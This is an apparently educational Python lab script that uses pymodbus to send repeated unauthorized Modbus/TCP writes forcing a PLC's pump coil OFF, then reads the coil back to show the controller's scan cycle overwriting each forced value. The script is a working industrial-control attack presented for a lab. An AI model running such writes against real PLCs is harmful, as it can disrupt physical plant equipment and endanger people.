#!/usr/bin/env python3
"""pump_override.py — unauthorized writes that force the pump coil OFF.

Modbus/TCP has no authentication, so any host that can reach port 502 may
write any coil. This connects to the lab PLC and writes the pump coil
(%QX0.0) to 0 repeatedly, fighting the running control program.

Instructive result: OpenPLC re-drives its output image every scan (~20 ms)
from the program logic, so when the program *wants* the pump on, each forced
OFF is overwritten almost immediately. The read-back makes that tug-of-war
visible. See the README for what this means in a real plant.

DESTRUCTIVE intent. Lab use only.
"""

from __future__ import annotations

import time

from pymodbus.client import ModbusTcpClient

from lab_target import MODBUS_UNIT, PLC_PORT, PUMP_COIL, log, resolve_plc

HOLD_SECONDS = 15
INTERVAL = 0.5


def main() -> None:
    ip = resolve_plc()
    c = ModbusTcpClient(ip, port=PLC_PORT, timeout=2)
    if not c.connect():
        raise SystemExit(f"cannot connect to PLC {ip}:{PLC_PORT}")

    log(f"pump_override start — forcing pump coil {PUMP_COIL} OFF on {ip} "
        f"for {HOLD_SECONDS}s")
    writes = 0
    held_off = 0
    try:
        end = time.time() + HOLD_SECONDS
        while time.time() < end:
            wr = c.write_coil(PUMP_COIL, False, device_id=MODBUS_UNIT)
            writes += 1
            status = "err" if wr.isError() else "ok"
            rc = c.read_coils(PUMP_COIL, count=1, device_id=MODBUS_UNIT)
            actual = None if rc.isError() else int(rc.bits[0])
            if actual == 0:
                held_off += 1
            log(f"  wrote pump=OFF [{status}]; PLC now reports pump={actual}")
            time.sleep(INTERVAL)
    finally:
        c.close()
    log(f"pump_override done — {writes} unauthorized writes, "
        f"pump read back OFF on {held_off}/{writes} checks")


if __name__ == "__main__":
    main()
